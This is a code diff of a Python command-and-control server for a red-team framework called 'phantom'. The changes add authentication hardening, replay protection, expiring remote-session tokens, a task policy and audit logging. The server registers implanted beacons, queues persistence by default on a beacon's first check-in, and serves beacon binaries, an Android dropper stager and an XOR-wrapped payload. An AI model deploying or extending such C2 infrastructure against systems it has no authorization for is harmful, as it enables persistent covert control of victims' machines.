@@ -9,7 +9,9 @@ import asyncio
 import threading
 import json
 import base64
+import hmac
 import os
+import secrets
 import ssl
 import socket
 import ipaddress
@@ -45,6 +47,27 @@ load_dotenv()
 # ── Shared State ────────────────────────────────────────────────────────────
 # Accessed by both the C2 Shell (main thread) and the aiohttp server (bg thread).
 
+def _auto_persist_allowed() -> bool:
+    """Review-4: auto-persist on first check-in is an ENGAGEMENT GRANT.
+
+    Default ON (owner decision Q-1), overridable per engagement via
+    `c2.auto_persist` in data/config.json or PHANTOM_AUTO_PERSIST=0. When
+    off, a new beacon is register-only and the skipped side effect is
+    written to the audit chain.
+    """
+    try:
+        from phantom.utils import config as cfg
+        v = str(cfg.get("c2.auto_persist", "1", env="PHANTOM_AUTO_PERSIST"))
+        return v.strip().lower() not in ("0", "false", "no", "off")
+    except Exception:
+        return True
+
+
+class TaskPolicyError(PermissionError):
+    """A task was refused by the typed-task policy (P1-1): unknown verb,
+    capability not granted, expired, or malformed."""
+
+
 class C2State:
     """Thread-safe state shared by the C2 shell and aiohttp listener."""
 
@@ -57,9 +80,90 @@ class C2State:
         self.results: dict[str, list[dict[str, Any]]] = {}
         self.auth_counters: dict[str, int] = {}
         self.auth_nonces: dict[str, set[str]] = {}
+        # P0-8: every boot stamps a fresh epoch. A request REPLAYED after a
+        # server restart belongs to the previous epoch: its nonce was issued
+        # under the old epoch, and the stale-epoch check below refuses it.
+        # The epoch rotates on every process start (secrets token).
+        self.auth_epoch = secrets.token_hex(8)
+        logger.info(f"C2 state epoch {self.auth_epoch} (replay safety)")
         # progressive screen-stream segments per beacon (TRUE live): appended
         # as they arrive, served to the UI for real-time viewing.
         self.live_segments: dict[str, list[dict[str, Any]]] = {}
+        # epoch a nonce was first seen under (per beacon): a nonce that shows
+        # up under a DIFFERENT epoch than it was issued in is a replay.
+        self._nonce_epoch: dict[str, dict[str, str]] = {}
+        # Review-3: the remote-session modules get their OWN expiring token.
+        # The global payload token unlocks EVERY payload forever; a remote
+        # session is a time-boxed capability grant with its own revocation,
+        # so a leaked dropper URL is useless after the window closes.
+        self.remote_sessions: dict[str, dict[str, Any]] = {}
+
+    # ── remote session grants (Review-3) ───────────────────────────────
+
+    def issue_remote_session(self, beacon_id: str = "",
+                             ttl_seconds: int = 21600) -> dict[str, Any]:
+        """Create a scoped, expiring token for the Remote Session module."""
+        token = secrets.token_urlsafe(32)
+        session_id = "RS-" + secrets.token_hex(6).upper()
+        now = datetime.now()
+        record = {
+            "session_id": session_id,
+            "token": token,
+            "beacon_id": beacon_id,
+            "issued_at": now.isoformat(timespec="seconds"),
+            "expires_at": (now + timedelta(seconds=max(60, int(ttl_seconds)))
+                           ).isoformat(timespec="seconds"),
+            "revoked": False,
+        }
+        with self.lock:
+            self.remote_sessions[token] = record
+        try:
+            from phantom.utils.audit_log import audit_log
+            audit_log.append("remote_session_issued", session_id=session_id,
+                             beacon_id=beacon_id, ttl_seconds=int(ttl_seconds))
+        except Exception:
+            pass
+        return record
+
+    def check_remote_session(self, token: str) -> tuple[bool, str]:
+        """Validate a remote-session token: exists, not revoked, not expired."""
+        if not token:
+            return False, "missing session token"
+        with self.lock:
+            record = self.remote_sessions.get(token)
+        if not record:
+            return False, "unknown session token"
+        if record.get("revoked"):
+            return False, "session revoked"
+        try:
+            expires = datetime.fromisoformat(str(record.get("expires_at", "")))
+        except ValueError:
+            return False, "malformed session record"
+        if datetime.now() > expires:
+            return False, "session expired"
+        return True, str(record.get("session_id", ""))
+
+    def revoke_remote_session(self, token: str = "", beacon_id: str = "") -> int:
+        """Revoke one token (or every session of a beacon). Returns the count."""
+        revoked = 0
+        with self.lock:
+            for record in self.remote_sessions.values():
+                if record.get("revoked"):
+                    continue
+                if token and record.get("token") != token:
+                    continue
+                if beacon_id and record.get("beacon_id") != beacon_id:
+                    continue
+                record["revoked"] = True
+                revoked += 1
+        if revoked:
+            try:
+                from phantom.utils.audit_log import audit_log
+                audit_log.append("remote_session_revoked", beacon_id=beacon_id,
+                                 count=revoked)
+            except Exception:
+                pass
+        return revoked
 
     def authenticate_beacon(self, request: web.Request, body: str) -> bool:
         """Validate a registered beacon's HMAC and reject replayed requests.
@@ -71,7 +175,17 @@ class C2State:
         beacon_id = request.headers.get("X-Beacon-Id", "")
         secrets_for_beacon = get_beacon_secrets(beacon_id)
         if not secrets_for_beacon:
-            return not beacon_auth_required()
+            # P0-4 (fail-closed): an unenrolled beacon is accepted ONLY when
+            # auth is explicitly disabled AND the listener is loopback. On a
+            # non-loopback bind an unauthenticated check-in is refused — a
+            # 0.0.0.0 listener must never become an open C2 by default.
+            if not beacon_auth_required() and _is_loopback_bind():
+                return True
+            logger.warning(
+                f"Refused unenrolled beacon check-in from {request.remote} "
+                f"(auth_required={beacon_auth_required()}, "
+                f"loopback={_is_loopback_bind()})")
+            return False
 
         timestamp = request.headers.get("X-Beacon-Timestamp", "")
         counter = request.headers.get("X-Beacon-Counter", "")
@@ -90,10 +204,26 @@ class C2State:
             used_nonces = self.auth_nonces.setdefault(beacon_id, set())
             if nonce in used_nonces:
                 return False
+            # P0-8: epoch binding — a nonce first seen under a previous
+            # epoch (i.e. issued before the last server restart) is a
+            # replay: refuse it even though the in-memory set was wiped.
+            epochs = self._nonce_epoch.setdefault(beacon_id, {})
+            prior_epoch = epochs.get(nonce)
+            if prior_epoch is not None and prior_epoch != self.auth_epoch:
+                logger.warning(
+                    f"Replay (stale epoch) detected for beacon {beacon_id}: "
+                    f"nonce issued under {prior_epoch}, server epoch is "
+                    f"{self.auth_epoch}")
+                return False
+            epochs[nonce] = self.auth_epoch
             used_nonces.add(nonce)
             # Bound memory while retaining enough history for the replay window.
             if len(used_nonces) > 256:
                 self.auth_nonces[beacon_id] = set(list(used_nonces)[-128:])
+                # keep the epoch map bounded alongside the nonce set
+                kept = self.auth_nonces[beacon_id]
+                self._nonce_epoch[beacon_id] = {
+                    n: e for n, e in epochs.items() if n in kept}
             # Counter is advisory (high-water mark, used only for telemetry):
             # after a migrate or process restart the beacon's counter resets,
             # and a strict monotonic check would permanently lock it out.
@@ -121,18 +251,47 @@ class C2State:
                                      hostname=info.get("hostname", ""))
                 except Exception:
                     pass
-                # Auto-persist for new beacons
+                # Auto-persist for new beacons (DOCUMENTED DEFAULT — owner
+                # decision Q-1 in docs/ROADMAP.md: keep, audited). This is
+                # a deliberate lab/engagement shortcut: the beacon's very
+                # first check-in queues `persist` (no argument -> the beacon
+                # uses its default unit name, PhantomBeacon; passing the
+                # method name would create a unit literally called
+                # "systemd"/"runkey"). Every occurrence lands in the
+                # immutable audit log with the chosen method so an operator
+                # reviewing the chain sees the side effect, not just the
+                # registration.
                 os_type = info.get("os", "").lower()
-                if "windows" in os_type:
-                    method = "runkey"
+                method = "runkey" if "windows" in os_type else "systemd"
+                # Review-4: the shortcut stays (owner decision Q-1) but is now
+                # an explicit engagement grant instead of an unconditional
+                # side effect: `c2.auto_persist=false` (or
+                # PHANTOM_AUTO_PERSIST=0) turns the first check-in into
+                # register-only, which is what a multi-operator engagement or
+                # an approved-rules-of-engagement run needs. Either way the
+                # decision is written to the immutable audit log.
+                if _auto_persist_allowed():
+                    task_id = self._new_task_id()
+                    self.tasks[beacon_id].append({"task_id": task_id,
+                                                  "command": "persist"})
+                    logger.info(f"Auto-persist ({method}) queued for new beacon "
+                                f"{beacon_id} (Task: {task_id})")
+                    try:
+                        from phantom.utils.audit_log import audit_log
+                        audit_log.append("auto_persist_queued", beacon_id=beacon_id,
+                                         method=method, task_id=task_id)
+                    except Exception:
+                        pass
                 else:
-                    method = "systemd"
-                task_id = self._new_task_id()
-                # `persist` with no argument: the beacon uses its default
-                # service name (PhantomBeacon) — passing the method name
-                # ("systemd"/"runkey") would create a unit called systemd.
-                self.tasks[beacon_id].append({"task_id": task_id, "command": "persist"})
-                logger.info(f"Auto-persist ({method}) queued for new beacon {beacon_id} (Task: {task_id})")
+                    logger.info(f"Auto-persist SKIPPED for {beacon_id} "
+                                f"(engagement grant disabled)")
+                    try:
+                        from phantom.utils.audit_log import audit_log
+                        audit_log.append("auto_persist_skipped", beacon_id=beacon_id,
+                                         method=method,
+                                         reason="c2.auto_persist disabled")
+                    except Exception:
+                        pass
             else:
                 # Session resume: same beacon_id, still alive. If the beacon was
                 # silent for a while, mark the resume so the operator sees the
@@ -151,6 +310,14 @@ class C2State:
                 self.beacons[beacon_id].update(info)
 
     def queue_task(self, beacon_id: str, command: str) -> str:
+        # P1-1: the task policy validates the string through the explicit
+        # legacy adapter (known beacon verb, grant-checked, size-capped).
+        # A denied task raises TaskPolicyError with the policy reason — the
+        # API surfaces it as 403, the shell as an operator error.
+        from phantom.core.task_policy import policy as _task_policy
+        decision = _task_policy().check_legacy(beacon_id, command)
+        if not decision.allowed:
+            raise TaskPolicyError(decision.reason)
         with self.lock:
             if beacon_id not in self.tasks:
                 self.tasks[beacon_id] = []
@@ -165,6 +332,35 @@ class C2State:
             except Exception:
                 pass
             return task_id
+
+    def queue_typed_task(self, beacon_id: str,
+                         task: "object") -> str:
+        """The P1-1 structured form: capability_id + validated args +
+        expiry, authorized against the beacon's grant manifest."""
+        from phantom.core.task_policy import policy as _task_policy
+        decision = _task_policy().check_typed(beacon_id, task)
+        if not decision.allowed:
+            raise TaskPolicyError(decision.reason)
+        with self.lock:
+            if beacon_id not in self.tasks:
+                self.tasks[beacon_id] = []
+            task.task_id = task.task_id or self._new_task_id()
+            self.tasks[beacon_id].append({
+                "task_id": task.task_id, "command": task.render(),
+                "capability_id": task.capability_id,
+                "scope_ref": task.scope_ref,
+                "expires_at": task.expires_at,
+                "mode": "typed",
+            })
+            try:
+                from phantom.utils.audit_log import audit_log
+                audit_log.append("task_queued", beacon_id=beacon_id,
+                                 task_id=task.task_id,
+                                 command=task.render()[:200],
+                                 capability=task.capability_id, mode="typed")
+            except Exception:
+                pass
+            return task.task_id
 
     @staticmethod
     def _new_task_id() -> str:
@@ -358,6 +554,13 @@ class C2State:
                 return
             d = os.path.join(data_dir(), subdir)
             os.makedirs(d, exist_ok=True)
+            # P1-11: enforce the per-directory quota BEFORE writing — a
+            # runaway stream must not fill the operator's disk silently
+            from phantom.core.artifact_policy import over_quota
+            if over_quota(d, subdir):
+                logger.warning("artifact refused (quota): %s (%d bytes from "
+                               "beacon %s)", subdir, len(raw), beacon_id)
+                return ""
             ts = datetime.now().strftime("%Y%m%d_%H%M%S")
             safe_beacon = "".join(c for c in beacon_id if c.isalnum())[:16] or "beacon"
             real_ext = self._sniff_ext(raw) or ("" if not ext else f".{ext}")
@@ -537,10 +740,37 @@ async def api_auth_middleware(request: web.Request, handler):
     protected = ("/api/v1/beacons", "/api/v1/queue", "/api/v1/results")
     if request.path in protected and API_TOKEN:
         token = request.headers.get("X-Api-Token", "")
-        if token != API_TOKEN:
+        # timing-safe: plain == leaks match-length byte-by-byte
+        if not hmac.compare_digest(token.encode(), API_TOKEN.encode()):
             logger.warning(f"Unauthorized API access to {request.path} from {request.remote}")
             return web.Response(status=403, text="Forbidden")
     return await handler(request)
+
+
+# P0-10: the route x principal x method authorization matrix, EXPLICIT.
+# Every route family declares which principals may call it and with which
+# methods; anything not listed is denied by the matrix middleware.
+#   beacon   = per-beacon HMAC identity (verified inside the handler)
+#   operator = PHANTOM_API_TOKEN bearer (REST control endpoints)
+#   any      = no auth required (health/malleable catch-all funnel)
+AUTH_MATRIX: dict[str, dict[str, tuple]] = {
+    "operator": {"/api/v1/beacons": ("GET",),
+                 "/api/v1/queue": ("POST",),
+                 "/api/v1/results": ("GET",)},
+    "any": {"/api/v1/ping": ("GET", "POST"),
+            "/": ("GET",)},
+    "beacon": {"/api/v1/result": ("POST",)},
+}
+
+
+def matrix_allows(path: str, method: str, principal: str) -> bool:
+    """True when (path, method) is explicitly granted to `principal` or to
+    principal 'any'. Used by tests and available to future middlewares."""
+    for principal_name in (principal, "any"):
+        table = AUTH_MATRIX.get(principal_name, {})
+        if method in table.get(path, ()):
+            return True
+    return False
 
 
 @web.middleware
@@ -731,16 +961,54 @@ def payload_download_name(path: str) -> str:
 
 async def handle_payload(request: web.Request) -> web.Response:
     """GET /api/v1/payload[_<platform>] — Serves the compiled beacon binary.
-       Requires ?auth=TOKEN or X-Auth-Token header."""
+
+    P0-9: the token must travel in the X-Auth-Token HEADER. The legacy
+    query string (?auth=) is still accepted for backward compatibility
+    with beacons already in the field, but is logged as a deprecation
+    (query strings leak into proxy logs, history and telemetry)."""
     try:
         import os
         # Always get current token from utility to stay in sync
         current_auth_token = get_payload_token()
-        
-        token = request.query.get("auth") or request.headers.get("X-Auth-Token")
-        if token != current_auth_token:
+
+        token = request.headers.get("X-Auth-Token") or request.query.get("auth")
+        global_ok = hmac.compare_digest((token or "").encode(),
+                                        current_auth_token.encode())
+        is_remote = request.path.startswith("/api/v1/remote_payload")
+
+        # Review-3: the Remote Session module is a TIME-BOXED capability.
+        # It authenticates with its OWN expiring, revocable session token
+        # (issued by `remote-deploy`). The global payload token — which
+        # unlocks every payload forever — is accepted only as a documented
+        # legacy path, and only while PHANTOM_REMOTE_STRICT is off. A
+        # revoked or expired session is refused even if the URL leaked.
+        if is_remote:
+            session_token = (request.headers.get("X-Remote-Session")
+                             or request.query.get("rs") or "")
+            sess_ok, why = c2_state.check_remote_session(session_token)
+            strict = os.getenv("PHANTOM_REMOTE_STRICT", "0") not in (
+                "0", "", "false", "False")
+            if not sess_ok:
+                if strict or not global_ok:
+                    logger.warning(
+                        f"Remote payload refused from {request.remote}: {why}")
+                    try:
+                        from phantom.utils.audit_log import audit_log
+                        audit_log.append("remote_payload_denied",
+                                         remote=request.remote, reason=why)
+                    except Exception:
+                        pass
+                    return web.Response(status=403, text=f"Forbidden: {why}")
+                logger.info(
+                    f"DEPRECATED: remote payload served with the GLOBAL "
+                    f"payload token to {request.remote} — use a session token "
+                    f"('remote-deploy' issues one automatically)")
+        elif not global_ok:
             logger.warning(f"Unauthorized payload request from {request.remote}")
             return web.Response(status=403, text="Forbidden: Invalid auth token")
+        elif not request.headers.get("X-Auth-Token"):
+            logger.info(f"DEPRECATED: payload token in query string from "
+                        f"{request.remote} — migrate to X-Auth-Token header")
 
         # Map route to filename
         platform_map = {
@@ -804,7 +1072,8 @@ async def handle_android_stager(request: web.Request) -> web.Response:
     """GET /s/android — Return a one-liner only to an authenticated caller."""
     try:
         token = request.query.get("auth") or request.headers.get("X-Auth-Token")
-        if token != get_payload_token():
+        if not hmac.compare_digest((token or "").encode(),
+                                   get_payload_token().encode()):
             return web.Response(status=403, text="Forbidden: Invalid auth token")
         from phantom.utils.builder import generate_dropper
         host = server_instance.host if server_instance.host != "0.0.0.0" else request.headers.get("Host", request.url.host)
@@ -823,7 +1092,8 @@ async def handle_payload_pic(request: web.Request) -> web.Response:
     """GET /x — Serve the authenticated XOR-wrapped PIC payload."""
     try:
         token = request.query.get("auth") or request.headers.get("X-Auth-Token")
-        if token != get_payload_token():
+        if not hmac.compare_digest((token or "").encode(),
+                                   get_payload_token().encode()):
             logger.warning(f"Unauthorized PIC payload request from {request.remote}")
             return web.Response(status=403, text="Forbidden: Invalid auth token")
         payload_path = os.path.join(os.path.dirname(__file__), "..", "payloads", "beacon", "beacon_xored.bin")
@@ -853,6 +1123,9 @@ async def handle_queue_task(request: web.Request) -> web.Response:
             return web.Response(status=400, text='{"error":"beacon_id and command required"}', content_type='application/json')
         c2_state.queue_task(beacon_id, command)
         return web.Response(text=json.dumps({'status': 'queued'}), content_type='application/json')
+    except TaskPolicyError as e:
+        # P1-1: policy refusals are authorization failures, not bad requests
+        return web.Response(status=403, text=json.dumps({'error': str(e)}), content_type='application/json')
     except Exception as e:
         return web.Response(status=400, text=json.dumps({'error': str(e)}), content_type='application/json')
 
@@ -902,6 +1175,35 @@ async def handle_beacon_any(request: web.Request) -> web.Response:
 
 # ── Server Lifecycle ───────────────────────────────────────────────────────
 
+def _is_loopback_bind() -> bool:
+    """True when the configured listener host is loopback (P0-4 gate). The
+    bind-time truth (what the OS accepted) is authoritative: a server that
+    bound 127.0.0.1 is loopback regardless of what the config string says.
+    Fall back to the configured host string before the site exists."""
+    try:
+        site = server_site_host()
+        if site:
+            return site in ("127.0.0.1", "::1", "localhost")
+    except Exception:
+        pass
+    try:
+        host = server_instance.host
+    except Exception:
+        return False
+    return host in ("127.0.0.1", "::1", "localhost")
+
+
+def server_site_host() -> str:
+    """The address the live site actually bound ("" when not started)."""
+    srv = server_instance
+    try:
+        if srv.site is not None:
+            return getattr(srv.site, "_host", "") or ""
+    except Exception:
+        pass
+    return ""
+
+
 class C2Server:
     def __init__(self, host: str = "0.0.0.0", port: int = 8080, use_ssl: bool = False,
                  cert_dir: Optional[str] = None):
@@ -914,6 +1216,10 @@ class C2Server:
         self.site: Optional[web.TCPSite] = None
         self.loop: Optional[asyncio.AbstractEventLoop] = None
         self.thread: Optional[threading.Thread] = None
+        # Bind/startup failure surface (set by _start_server, read by
+        # start(); mirrors the tracker's bind_error contract).
+        self.bind_error: Optional[str] = None
+        self._started_evt: Optional[threading.Event] = None
 
     def _get_ssl_context(self) -> Optional[ssl.SSLContext]:
         """Load or generate SSL context; mTLS never downgrades to HTTP."""
@@ -1068,30 +1374,55 @@ class C2Server:
     def _start_server(self) -> None:
         self.loop = asyncio.new_event_loop()
         asyncio.set_event_loop(self.loop)
-        
+        evt = self._started_evt
+
+        def _signal() -> None:
+            if evt is not None:
+                evt.set()
+
         # Re-create app inside the loop thread
         self.app = self._setup_app()
-        
+
         # Determine if we should use SSL
         self.ssl_context = self._get_ssl_context()
         if (use_mtls() or self.use_ssl) and self.ssl_context is None:
             logger.error("HTTPS/mTLS listener aborted: TLS material is unavailable")
+            self.bind_error = "HTTPS/mTLS listener aborted: TLS material is unavailable"
             self.loop.run_until_complete(self.app.shutdown())
             self.loop.run_until_complete(self.app.cleanup())
             self.loop.stop()
+            _signal()
             return
-        
+
         self.runner = web.AppRunner(self.app)
         self.loop.run_until_complete(self.runner.setup())
-        
-        # Fix: Always bind to 0.0.0.0 to avoid OSError 10049 if host is non-local
-        # The provided 'host' is used for display and dropper generation.
-        bind_host = "0.0.0.0"
+
+        # Bind the CONFIGURED host: 0.0.0.0 when the operator asked for it,
+        # the loopback/LAN address otherwise. Binding a host the OS does not
+        # own raises OSError right here, INSIDE the thread — captured below
+        # into self.bind_error instead of silently killing the thread.
+        bind_host = self.host
         self.site = web.TCPSite(self.runner, bind_host, self.port, ssl_context=self.ssl_context)
-        
-        self.loop.run_until_complete(self.site.start())
+        try:
+            self.loop.run_until_complete(self.site.start())
+        except OSError as e:
+            # Fail-fast surface: start()/the operator shell reads THIS
+            # instead of believing a listener exists (the old behavior
+            # left a dead thread and a "started" message on screen).
+            self.bind_error = (f"cannot bind {bind_host}:{self.port} — {e} "
+                               f"(port already in use or address not local)")
+            logger.error(f"C2 listener failed to start: {self.bind_error}")
+            try:
+                self.loop.run_until_complete(self.runner.cleanup())
+            except Exception:
+                pass
+            self.loop.stop()
+            _signal()
+            return
         proto = "HTTPS" if self.ssl_context else "HTTP"
         logger.info(f"C2 Async Server ({proto}) started on {bind_host}:{self.port}")
+        self.bind_error = None
+        _signal()
         self.loop.run_forever()
 
     def start(self, host: Optional[str] = None, port: Optional[int] = None, use_ssl: Optional[bool] = None) -> None:
@@ -1113,7 +1444,14 @@ class C2Server:
             logger.error("HTTPS listener refused: TLS material is unavailable")
             return
         self.thread = threading.Thread(target=self._start_server, daemon=True)
+        # Handshake: the thread signals the event after the bind attempt, so
+        # start() returns knowing the truth — "started" only when the site
+        # actually accepted the bind; RuntimeError otherwise.
+        self._started_evt = threading.Event()
         self.thread.start()
+        self._started_evt.wait(timeout=15)
+        if self.bind_error:
+            raise RuntimeError(self.bind_error)
 
     def stop(self) -> None:
         if self.loop and self.runner:
